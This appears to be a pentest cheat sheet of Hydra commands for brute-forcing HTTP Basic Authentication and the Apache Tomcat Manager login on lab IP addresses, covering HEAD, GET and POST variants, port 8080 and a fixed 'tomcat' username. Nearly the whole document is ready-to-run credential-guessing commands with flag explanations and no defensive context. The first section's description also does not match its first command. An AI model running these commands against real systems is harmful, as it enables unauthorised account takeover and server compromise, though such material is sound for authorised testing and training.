# Hydra-HTTP-Basic-Authentication-Brute-Force

## Basic HTTP Authentication (HEAD Method)

This command performs a brute-force attack on HTTP Basic Authentication by sending `HEAD` requests to the `/test` endpoint at `192.168.1.40`.
It attempts to authenticate using the usernames from `/opt/user.txt` and passwords from `/opt/password.txt`.

```bash
hydra -L /opt/usr-pass/top-usernames-shortlist.txt -P /opt/usr-pass/default-passwords.txt 192.168.1.25 http-head "/webdav"
```

```bash
hydra -L /opt/user.txt -P /opt/password.txt 192.168.1.40 http-head "/test"
```

---

## HTTP Authentication on Port 8080 with Stop on First Success

This command is similar to the previous one, but explicitly specifies port `8080` (`-s 8080`).
Additionally, the `-f` flag ensures Hydra stops after finding the first valid username-password pair.

```bash
hydra -L /opt/user.txt -P /opt/password.txt -s 8080 -f 192.168.1.40 http-head "/test"
```

---

## HTTP GET Method on Port 8080

This command performs a brute-force attack on HTTP Basic Authentication using the HTTP `GET` method.
It sends GET requests to the `/test` endpoint on port `8080`, using the credentials from `/opt/user.txt` and `/opt/password.txt`.

```bash
hydra -L /opt/user.txt -P /opt/password.txt -s 8080 -f 192.168.1.40 http-get "/test"
```

---

## HTTP GET Request in URL Format

This is a variant of the previous command, formatted in URL style.
It uses the HTTP GET method to attempt brute-forcing authentication at the `/test` endpoint of `192.168.1.40`.

```bash
hydra -L /opt/user.txt -P /opt/password.txt http-get://192.168.1.40/test
```

---

## HTTP POST Method

This command uses the HTTP `POST` method to send requests to the `/test` endpoint.
It is suitable for forms or services that require POST requests for authentication, attempting to brute-force the credentials from `/opt/user.txt` and `/opt/password.txt`.

```bash
hydra -L /opt/user.txt -P /opt/password.txt http-post://192.168.1.40/test
```

---

## Apache Tomcat Brute Force (HTTP GET)

This command performs brute-forcing against the Apache Tomcat Manager on port `8080` using HTTP `GET` requests.
It uses the usernames from `apache_tomcat_users.txt` and passwords from `apache_tomcat_passwords.txt`.

```bash
hydra -L apache_tomcat_users.txt -P apache_tomcat_passwords.txt -s 8080 -f 192.168.1.203 http-get /manager
```

---

## Apache Tomcat Brute Force (URL Format)

Similar to the previous command but in URL format.
This command attempts to brute-force the Tomcat Manager using the credentials from `apache_tomcat_users.txt` and `apache_tomcat_passwords.txt`.

```bash
hydra -L apache_tomcat_users.txt -P apache_tomcat_passwords.txt http-get://192.168.1.203:8080/manager
```

---

## Apache Tomcat Brute Force (HTTP HEAD Method)

This command uses the HTTP `HEAD` method to attempt brute-forcing the Apache Tomcat Manager located at `192.168.1.203` on port `8080`.

```bash
hydra -L apache_tomcat_users.txt -P apache_tomcat_passwords.txt http-head://192.168.1.203:8080/manager
```

---

## Apache Tomcat Brute Force (HEAD on /manager)

This command sends HTTP `HEAD` requests to the `/manager` path on the Apache Tomcat Manager at `192.168.1.203` on port `8080`.
It attempts to brute-force authentication on this specific path.

```bash
hydra -L apache_tomcat_users.txt -P apache_tomcat_passwords.txt -s 8080 192.168.1.203 http-head "/manager"
```

---

## Single Username (`tomcat`) and Password List

This command uses a fixed username (`tomcat`) and brute-forces the password list `apache_tomcat_passwords.txt` against the `/manager/html` path on the Apache Tomcat Manager located at `192.168.1.203` on port `8080`.

```bash
hydra -l tomcat -P apache_tomcat_passwords.txt -s 8080 192.168.1.203 http-head "/manager/html"
```

---
